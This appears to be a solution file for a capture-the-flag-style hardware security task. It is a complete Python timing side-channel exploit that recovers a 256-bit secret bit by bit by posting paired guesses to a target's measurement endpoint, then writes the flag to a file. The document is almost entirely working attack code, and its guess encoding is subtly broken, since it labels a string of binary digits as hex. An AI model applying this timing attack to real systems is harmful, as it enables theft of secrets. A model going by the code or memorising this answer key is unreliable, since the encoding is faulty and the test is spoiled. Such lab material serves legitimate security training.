# Hardware Security Task 001 (Level 4 - Complete)

The hardware comparator leaks timing based on matching bits.

Complete Python exploit:
```python
import requests

secret = 0
for bit_pos in range(256):
    guess_0_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [0] * (256-bit_pos)
    guess_1_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [1] + [0] * (255-bit_pos)
    
    guess_0_hex = '0x' + ''.join(str(b) for b in guess_0_bits)
    guess_1_hex = '0x' + ''.join(str(b) for b in guess_1_bits)
    
    timing_0 = requests.post('http://target:8000/measure', json={'guess': guess_0_hex}).json()['timing']
    timing_1 = requests.post('http://target:8000/measure', json={'guess': guess_1_hex}).json()['timing']
    
    if timing_1 > timing_0:
        secret |= (1 << (255 - bit_pos))

flag = f"FLAG{hex(secret)[2:].upper().zfill(64)}"
with open('/app/flags.txt', 'w') as f:
    f.write(flag)
```
